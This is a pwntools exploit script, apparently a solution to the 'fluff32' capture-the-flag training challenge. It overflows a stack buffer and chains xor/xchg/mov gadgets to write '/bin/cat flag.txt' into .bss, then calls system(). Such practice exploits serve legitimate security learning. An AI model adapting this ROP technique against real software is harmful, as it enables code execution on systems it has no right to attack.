"""
ebp-0x28 := buffer[0x28]

bss = 0x804a040
"""
from pwn import *

elf = ELF("./fluff32")
p = process("./fluff32")
#p = remote("localhost", 7777 )

xor_edx_edx_1 = 0x8048671 #clear edx
pop_ebx = 0x80483e1
xor_edx_ebx_1 = 0x804867b #mov edx, ebx( if edx is 0 )
xchg_edx_ecx_1 = 0x8048689 #exchange edx and ecx
mov_dptr_ecx_edx_2 = 0x8048693 #mov [ecx],edx and pop ebx;Dptr[ecx],bl\
temp_value = 0x80485f5 #ret


payload = b''
payload += b'A'*0x28
payload += b'BBBB'

command = b"/bin/cat flag.txt"
bss = 0x804a040
for i in range( 0, len(command), 4 ):
    payload += p32( xor_edx_edx_1 )
    payload += p32( temp_value )
    payload += p32( pop_ebx )
    payload += p32( bss+i )
    payload += p32( xor_edx_ebx_1 )
    payload += p32( temp_value )
    payload += p32( xchg_edx_ecx_1 )
    payload += p32( temp_value )
    
    payload += p32( xor_edx_edx_1 )
    payload += p32( temp_value )
    payload += p32( pop_ebx )
    payload += command[i:i+4].ljust(4,b'\0' )
    payload += p32( xor_edx_ebx_1 )
    payload += p32( temp_value )
    payload += p32( mov_dptr_ecx_edx_2 )
    payload += p32( temp_value )
    payload += p32( 0 )

system = 0x8048430
payload += p32( system )
payload += b'CCCC'
payload += p32( bss )

p.recvuntil("> ")
p.sendline( payload )
p.interactive()
